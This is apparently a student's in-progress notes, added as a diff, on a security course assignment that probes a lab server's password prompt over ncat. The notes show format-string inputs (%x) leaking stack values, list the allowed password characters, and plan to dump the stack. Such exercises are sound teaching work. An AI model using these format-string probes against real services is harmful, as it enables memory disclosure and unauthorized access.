@@ -1,0 +1,55 @@
+# Assignment 3 - Problem 1
+
+```bash
+ncat 10.21.235.155 1023
+```
+
+Example Connection
+
+```
+suraj@amd-rathi ~ % ncat 10.21.235.155 1023
+
+Who are you? a
+
+What is the password? bbb
+bbb is not the correct password.
+```
+
+We see that the password string is passed as a format string
+
+```
+suraj@amd-rathi ~ % ncat 10.21.235.155 1023
+
+Who are you? a
+
+What is the password? %x%x
+4e332aa025 is not the correct password.
+```
+
+alphanumeric and is exactly 30 bytes long
+
+- [48, 57]
+- [65, 90]
+- [97, 122]
+
+The ascii codes can only be in this range.
+
+``` 
+suraj@amd-rathi ~ % ncat 10.21.235.155 1023
+
+Who are you? a
+
+What is the password? aaaaaaaaaabbbbbbbbbbcccccccccc%x%x%x%x
+aaaaaaaaaabbbbbbbbbbccccccccccdd15720061f7ffffdf99a8f060 is not the correct password.
+```
+
+Questions
+
+1. Do any of the buffers also allow us to overflow them?
+2. Do any of the buffers allow us to write '\0'
+3. Are only 30 bytes of the password checked/stored/coppied ?
+
+TODO:
+
+1. Automate the ncat process
+2. Dump a large part of the stack and just open it in a hexeditor.
